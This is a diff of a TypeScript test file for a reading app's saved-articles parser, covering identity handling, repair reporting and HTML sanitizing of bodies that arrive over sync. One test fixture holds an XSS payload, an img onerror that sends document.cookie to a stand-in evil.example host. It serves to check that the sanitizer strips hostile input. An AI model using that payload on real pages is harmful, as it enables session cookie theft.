@@ -19,6 +19,7 @@ import {
   savedArticleId,
   savedArticlesForTopic,
   upsertSavedArticle,
+  type SavedArticle,
   type SavedArticleInput,
 } from "../../src/reading/saved-articles";
 import { toSavedArticleInput } from "../../src/ui/components/info/saveArticle";
@@ -173,12 +174,46 @@ test("savedArticlesForTopic filters by topic, newest save first", () => {
 
 // --- parse / display --------------------------------------------------------
 
-test("parseSavedArticles drops entries without an identity and survives garbage", () => {
+// parseSavedArticles takes what readGuardedJson parsed; these tests still start
+// from the bytes, so they parse first. A body that will not parse at all never
+// reaches it — readGuardedJson quarantines the file instead.
+function parseFile(text: string): SavedArticle[] {
+  return parseSavedArticles(JSON.parse(text) as unknown)?.articles ?? [];
+}
+
+test("parseSavedArticles keeps every record it can identify", () => {
   const good = buildSavedArticle(input(), 1);
-  const text = JSON.stringify([good, { title: "no id" }, { id: "" }, null]);
-  expect(parseSavedArticles(text).map((a) => a.id)).toEqual([good.id]);
-  expect(parseSavedArticles("not json")).toEqual([]);
-  expect(parseSavedArticles('{"articles":[]}')).toEqual([]);
+  const parsed = parseSavedArticles([
+    good,
+    // No id, but a url: it gets the id saveArticle would have given it rather
+    // than being dropped.
+    { url: "https://example.com/no-id", title: "no id" },
+    // A field this build does not know is not a reason to drop the record.
+    { id: "https://example.com/future", title: "from a newer build", mood: "curious" },
+  ]);
+  expect(parsed?.articles.map((a) => a.id)).toEqual([
+    good.id,
+    "https://example.com/no-id",
+    "https://example.com/future",
+  ]);
+  // Nothing was left behind, so the file is not worth setting aside.
+  expect(parsed?.repaired).toBe(false);
+});
+
+test("parseSavedArticles reports the entries it cannot carry", () => {
+  const good = buildSavedArticle(input(), 1);
+  // An entry with no identity at all and a duplicate of one already taken: the
+  // sync merge turns down a whole file holding either (readCollection), so they
+  // cannot be written back — they stay in the quarantined copy.
+  const parsed = parseSavedArticles([good, null, { savedAt: 3 }, { id: good.id, title: "twin" }]);
+  expect(parsed?.articles.map((a) => a.id)).toEqual([good.id]);
+  expect(parsed?.repaired).toBe(true);
+});
+
+test("parseSavedArticles turns down a file that is not an array of records", () => {
+  expect(parseSavedArticles({ articles: [] })).toBeNull();
+  expect(parseSavedArticles("not a list")).toBeNull();
+  expect(parseSavedArticles([])).toEqual({ articles: [], repaired: false });
 });
 
 // saved-articles.json sits in the synced folder and merges record by record, so
@@ -206,7 +241,7 @@ function hostileFile(html: string): string {
 }
 
 test("parseSavedArticles neutralizes a body that arrived over sync, not through saveArticle", () => {
-  const [article] = parseSavedArticles(
+  const [article] = parseFile(
     hostileFile(
       `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` +
         `<script>alert(1)</script>` +
@@ -227,7 +262,7 @@ test("parseSavedArticles neutralizes a body that arrived over sync, not through 
 // when the tag holds no other usable URL — so the read strips data images too,
 // the same rule the write side applies for size.
 test("parseSavedArticles drops an inlined data: image reaching it from the file", () => {
-  const [article] = parseSavedArticles(
+  const [article] = parseFile(
     hostileFile(`<p>a</p><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="><p>b</p>`),
   );
   expect(article.html).toBe("<p>a</p><p>b</p>");
@@ -237,7 +272,7 @@ test("parseSavedArticles drops an inlined data: image reaching it from the file"
 // renders the same today.
 test("parseSavedArticles leaves an ordinary saved body alone", () => {
   const html = `<p>Real prose with <b>bold</b>.</p><img src="https://cdn.example/a.jpg" loading="lazy">`;
-  const [article] = parseSavedArticles(hostileFile(html));
+  const [article] = parseFile(hostileFile(html));
   expect(article.html).toBe(html);
 });
 
@@ -251,9 +286,9 @@ test("a stored body renders the same on its tenth read as on its first", () => {
     `<img src="https://cdn.example/a.jpg?w=640&amp;h=480">` +
     `<img src="https://&amp;#101;vil.example/b.jpg">` +
     `<a href="https://x.example/?q=1&amp;r=2">link</a>`;
-  const first = parseSavedArticles(hostileFile(stored))[0].html;
+  const first = parseFile(hostileFile(stored))[0].html;
   let body = first;
-  for (let i = 0; i < 9; i += 1) body = parseSavedArticles(hostileFile(body))[0].html;
+  for (let i = 0; i < 9; i += 1) body = parseFile(hostileFile(body))[0].html;
   expect(body).toBe(first);
   expect(first).toContain('src="https://&amp;#101;vil.example/b.jpg"');
 
@@ -272,18 +307,18 @@ test("a stored body renders the same on its tenth read as on its first", () => {
 // the second read and not the first.
 test("dropping an inlined image does not leave the body to settle on a later read", () => {
   const stored = `<pre><img src="data:image/png;base64,AAAA">\n  git log\n</pre>`;
-  const first = parseSavedArticles(hostileFile(stored))[0].html;
+  const first = parseFile(hostileFile(stored))[0].html;
   let body = first;
-  for (let i = 0; i < 9; i += 1) body = parseSavedArticles(hostileFile(body))[0].html;
+  for (let i = 0; i < 9; i += 1) body = parseFile(hostileFile(body))[0].html;
   expect(body).toBe(first);
   // The newline was the one the tree builder eats after a <pre> start tag; with
   // the image gone it is the first thing in the block, so it goes.
   expect(first).toBe(`<pre>  git log\n</pre>`);
   // A blank line the reader can see is kept, on the first read and the tenth.
   const blank = `<pre><img src="data:image/png;base64,AAAA">\n\n  git log\n</pre>`;
-  const kept = parseSavedArticles(hostileFile(blank))[0].html;
+  const kept = parseFile(hostileFile(blank))[0].html;
   expect(kept).toBe(`<pre>\n\n  git log\n</pre>`);
-  expect(parseSavedArticles(hostileFile(kept))[0].html).toBe(kept);
+  expect(parseFile(hostileFile(kept))[0].html).toBe(kept);
 });
 
 // Collects what rewriteImageSrcs hands the proxy mapper, which outside Tauri is
@@ -297,7 +332,7 @@ function rewriteProbe(html: string, into: string[]): void {
 
 test("parseSavedArticles survives a record whose html is not a string", () => {
   const text = JSON.stringify([{ id: "x", html: 42 }, { id: "y" }]);
-  expect(parseSavedArticles(text).map((a) => a.html)).toEqual(["", ""]);
+  expect(parseFile(text).map((a) => a.html)).toEqual(["", ""]);
 });
 
 test("formatPublishedAt shows an unparseable date verbatim and nothing for none", () => {
